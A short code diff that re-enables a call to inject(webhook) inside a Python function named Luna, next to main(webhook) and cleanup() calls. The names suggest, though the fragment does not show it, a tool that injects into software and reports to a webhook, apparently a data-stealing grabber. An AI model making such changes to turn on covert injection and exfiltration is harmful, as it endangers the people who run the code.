@@ -69,7 +69,7 @@ def main(webhook):
 def Luna():
     debug()
     main(webhook)
-    # inject(webhook) debugging lol
+    inject(webhook)
     cleanup()
 
 
